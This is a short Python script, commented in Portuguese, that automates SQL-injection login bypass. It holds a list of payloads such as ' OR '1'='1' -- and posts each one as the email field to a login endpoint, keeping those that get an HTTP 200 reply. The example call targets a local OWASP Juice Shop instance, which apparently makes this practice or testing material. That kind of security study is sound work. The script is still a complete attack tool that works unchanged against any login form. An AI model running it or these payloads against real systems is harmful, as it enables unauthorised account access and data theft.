import requests

# Lista de payloads para tentar burlar a injeção SQL em campos de login
bypass_sql_injection_list = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' ({",
    "' OR '1'='1' /*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR 'a'='a",
    "' OR 'a'='a' -- ",
    "' OR 'a'='a' ({",
    "' OR 'a'='a' /*",
    "' OR '1'='1' LIMIT 1; -- ",
    "' OR '1'='1' LIMIT 1; #",
    "' OR '1'='1' LIMIT 1; /*"
]

def login_test(url, json_login):
    """Realiza o POST de login e retorna o response."""
    try:
        response = requests.post(url, json=json_login)
        return response
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        return

def json_login_build(email, password):
    """Cria o payload JSON para o login."""
    return {
        "email": email,
        "password": password
    }

def sql_injection_test(payloads, url):
    """Testa cada payload na lista de injeção SQL e retorna os que funcionaram."""
    # Lista de bypass que funcionaram
    bypassed_payloads = []
    for payload in payloads:
        json_login = json_login_build(payload, "password")
        response = login_test(url, json_login)
        if response.status_code == 200:
            bypassed_payloads.append(payload)
    return bypassed_payloads


# Exemplo de uso no JuiceShop
sql_injection_test(bypass_sql_injection_list, "http://localhost:3000/rest/user/login")
